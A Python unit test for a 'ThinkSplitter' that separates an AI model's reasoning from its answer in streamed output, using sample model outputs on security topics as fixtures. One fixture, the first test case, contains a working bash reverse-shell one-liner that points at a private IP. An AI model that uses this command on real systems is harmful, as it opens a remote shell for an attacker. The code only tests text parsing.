#!/usr/bin/env python3
"""Local unit test for ThinkSplitter against real vornith output shapes."""
import sys
sys.modules.setdefault("requests", type(sys)("requests"))  # stub: splitter test needs no HTTP
sys.path.insert(0, "/Users/drjones/draco")
from draco_core import ThinkSplitter

def run(chunks):
    sp = ThinkSplitter()
    think, ans = "", ""
    for c in chunks:
        for ch, piece in sp.feed(c):
            if ch == "think": think += piece
            else: ans += piece
    for ch, piece in sp.flush():
        if ch == "think": think += piece
        else: ans += piece
    return think.strip(), ans.strip()

def tokens(s, n=7):
    words = s.split(" ")
    return [" ".join(words[i:i+n]) + " " for i in range(0, len(words), n)]

fail = 0
def check(name, chunks, want_think_prefix, want_ans_prefix):
    global fail
    t, a = run(chunks)
    ok = t.startswith(want_think_prefix) and a.startswith(want_ans_prefix)
    print(("PASS" if ok else "FAIL"), name)
    if not ok:
        fail += 1
        print("  think:", repr(t[:120]))
        print("  ans  :", repr(a[:120]))

# 1. untagged multi-paragraph narration → answer (the real reverse-shell case)
s1 = ("The user asks about a \"reverse shell one-liner in bash.\" Let me look at the excerpts.\n\n"
      "The excerpts are about UNIX Power Tools, Perl Cookbook, UNIX Hints and Hacks, "
      "Essential System Administration. None of them contain information about a \"reverse shell one-liner.\"\n\n"
      "So I should say the excerpts don't contain the answer, and answer from general knowledge "
      "marked (general knowledge).\n\n"
      "A reverse shell is a shell session initiated by the target machine back to the attacker's "
      "listener. A classic bash one-liner is: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
check("untagged narration→answer", tokens(s1), "The user asks", "A reverse shell is")

# 2. tagged <think>...</think>
s2 = ("<think>Simple factual question.</think>\n\nA stack buffer overflow occurs when a program "
      "writes more data than a fixed-size buffer can hold.")
check("tagged think", tokens(s2), "Simple factual", "A stack buffer overflow occurs")

# 3. missing opener (bare </think>)
s3 = ("The user wants a one-sentence explanation of a stack buffer overflow. Let me be concise.\n"
      "</think>\n\nA stack buffer overflow occurs when a program writes more data than a fixed-size "
      "buffer on the stack can hold.")
check("missing opener", tokens(s3), "The user wants", "A stack buffer overflow occurs")

# 4. direct answer, no tags, no narration
s4 = ("A strong password hash uses a slow, salted algorithm such as bcrypt, scrypt, or argon2. "
      "Fast hashes like MD5 and SHA-1 are unsuitable because attackers can brute-force billions "
      "of guesses per second on modern GPUs.")
check("direct answer", tokens(s4), "", "A strong password hash uses")

# 5. narration with **bold** opener then list content
s5 = ("**Understanding the question**\nThe user wants to know about SQL injection. Let me examine the passages.\n\n"
      "SQL injection occurs when untrusted input is concatenated into a query. Use parameterized "
      "statements to prevent it.")
t, a = run(tokens(s5))
print("PASS" if a.startswith("SQL injection occurs") else "FAIL", "bold-opener narration (answer starts at content)")
if not a.startswith("SQL injection occurs"): fail += 1; print("  ans:", repr(a[:100]))

# 6. short direct answer (gate never reaches 140 chars → flush decides)
s6 = "Use bcrypt with a per-user salt."
t, a = run(tokens(s6))
print("PASS" if a.startswith("Use bcrypt") and t == "" else "FAIL", "short direct answer")
if not (a.startswith("Use bcrypt") and t == ""): fail += 1; print("  think:", repr(t[:80]), "ans:", repr(a[:80]))

print("FAILURES:", fail)
sys.exit(1 if fail else 0)
